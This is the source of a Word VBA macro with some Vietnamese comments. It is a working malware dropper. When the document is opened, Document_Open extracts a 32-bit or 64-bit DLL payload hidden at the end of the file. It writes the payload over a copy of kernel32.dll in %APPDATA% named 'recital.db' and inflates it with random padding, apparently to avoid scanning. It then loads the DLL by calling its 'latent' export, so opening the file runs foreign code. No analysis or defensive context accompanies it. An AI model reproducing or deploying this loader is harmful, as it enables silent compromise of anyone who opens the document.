' Thieu Option Explicit o day may cha

#If VBA7 Then
    Private Declare PtrSafe Sub latent Lib "recital.db" ()
#Else
    Private Declare Sub latent Lib "recital.db" ()
#End If

Const padding As Long = 94737554
Dim strWinVer As String
Dim strThisDoc As String

' Unused module variables, x�a di chu cac ban
Const gQ293KG0KIk78 As Long = 76
Dim FyXhf1V099udu1I As String
Dim JomG10UC3IStH3z As String

Private Sub MainProc()
    On Error Resume Next

    CheckWin64

    str_recital_db = "recital.db"
    strThisDoc = ThisDocument.FullName
    FileCopy Environ("windir") & "\system32\kernel32.dll", Environ("appdata") & "\" & str_recital_db
    Read_Payload_DLL
    call_latent_proc
End Sub

Private Sub CheckWin64()
#If VBA7 Then
    #If Win64 Then
        strWinVer = 2
    #Else
        strWinVer = 1
    #End If
#Else
    strWinVer = 1
#End If
End Sub

Function MakeFullPath(strDir As String, strFName As String) As String
    Dim fso As Object
    Dim objFolder As Folder
    Dim objChildFolder As Folder
    Dim objFile As File
    Dim iFound As Integer

    Set fso = CreateObject("Scripting.FileSystemObject")
    Set objFolder = fso.GetFolder(strDir)

    iFound = 0
    MakeFullPath = ""
    For Each objFile In objFolder.Files
        If InStr(1, LCase(objFile.Name), strFName) <> 0 Then
            iFound = 1
            MakeFullPath = objFile.Path
            Exit For
        End If
    Next

    If iFound = 0 Then
        For Each objChildFolder In objFolder.SubFolders
            MakeFullPath = MakeFullPath(objChildFolder.Path, strFName)
            If MakeFullPath <> "" Then
                Exit For
            End If
        Next
    End If
End Function

Private Sub Read_Payload_DLL()
    Dim iF As Long
    Dim lPos As Long
    Dim lSize As Long

    iF = FreeFile
    Open strThisDoc For Binary Access Read As iF
    lPos = LOF(iF) + 1
    For I = 1 To 2
        Seek iF, lPos - 4
        Get iF, , lSize
        If lSize = 0 Then
            Exit For
        End If

        lPos = lPos - 4 - lSize
        If strWinVer = I Then
            Write_Payload_DLL_To iF, lPos, lSize
            Exit For
        End If
    Next I
    Close iF
End Sub

Sub Write_Payload_DLL_To(iFSrc As Long, lPos As Long, lSize As Long)
    Dim arrBuf() As Byte

    Randomize
    ReDim arrBuf(lSize - 2 + padding)

    Seek iFSrc, lPos + 2
    Get iFSrc, , arrBuf()
    For I = 0 To padding
        arrBuf(I + lSize - 2) = 255 * Rnd   ' Write random data to remains file
    Next I

    Dim iFDst As Long
    iFDst = FreeFile
    Open Environ("appdata") & "\" & str_recital_db For Binary Access Write As iFDst
    Seek iFDst, 3   ' Giu lai MZ => ra PE :D
    Put iFDst, , arrBuf()
    Close iFDst
End Sub

Private Sub call_latent_proc()
    Dim sCurrentDir As String

    sCurrentDir = CurDir()
    ChDir Environ("appdata")
    latent  ' WaitForSingleObject in fi ni te ;)
End Sub

Private Sub Document_Open()
    MainProc
End Sub
